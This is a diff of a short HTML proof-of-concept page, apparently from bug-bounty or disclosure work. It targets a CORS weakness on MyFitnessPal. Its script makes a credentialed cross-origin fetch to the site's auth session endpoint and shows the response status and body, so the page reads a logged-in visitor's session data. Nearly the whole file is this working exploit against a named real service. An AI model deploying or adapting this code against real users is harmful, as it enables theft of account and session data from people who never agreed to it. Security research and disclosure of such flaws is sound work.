@@ -1,22 +1,31 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="utf-8">
+  <title>MyFitnessPal CORS PoC</title>
+</head>
 <body>
-<h3>CORS Proof of Concept</h3>
-<pre id="result">Loading...</pre>
+<h2>MyFitnessPal – CORS Read PoC</h2>
+<pre id="output">Loading...</pre>
 
 <script>
 fetch("https://www.myfitnesspal.com/api/auth/session", {
   method: "GET",
-  credentials: "include" 
+  credentials: "include"
 })
-.then(response => response.text())
+.then(response => {
+  document.getElementById("output").innerText =
+    "Status: " + response.status + "\n\n";
+  return response.text();
+})
 .then(data => {
-  document.getElementById("result").innerText = data;
+  document.getElementById("output").innerText +=
+    "Response Body:\n" + data;
 })
-.catch(error => {
-  document.getElementById("result").innerText = error;
+.catch(err => {
+  document.getElementById("output").innerText =
+    "Error:\n" + err;
 });
 </script>
-
 </body>
 </html>
